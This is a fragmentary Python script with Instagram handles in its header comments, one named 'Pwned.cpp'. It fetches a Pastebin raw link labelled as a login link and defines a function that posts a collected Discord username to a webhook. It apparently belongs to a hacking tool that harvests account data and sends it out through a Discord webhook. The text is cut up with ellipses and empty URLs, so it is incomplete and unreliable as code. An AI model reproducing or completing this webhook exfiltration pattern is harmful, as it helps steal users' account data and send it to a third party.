...
#https://instagram.com/Pwned.cpp
#https://instagram.com/b_h_
import os
import uuid
...
r = requests.get('https://pastebin.com/raw/') #PasteBin Login Link
...
def discord():
    hook = Webhook("") #Webhook send user discord
    data = {d2['username']}
    hook.send(data)
